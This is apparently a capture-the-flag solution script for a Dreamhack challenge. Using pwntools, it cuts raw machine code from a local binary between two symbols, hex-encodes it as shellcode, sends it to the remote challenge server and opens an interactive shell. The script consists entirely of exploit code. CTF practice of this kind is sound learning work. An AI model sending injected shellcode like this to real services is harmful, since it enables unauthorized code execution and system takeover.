import binascii
from pwn import *

r = remote('host1.dreamhack.games', 23211)
e = ELF('./solve')

f = open('./solve', 'rb')
shellcode = f.read()[e.symbols['main']:e.symbols['__libc_csu_init']]
f.close()
shellcode = binascii.hexlify(shellcode)

r.recvline()
r.sendline(shellcode)

r.interactive()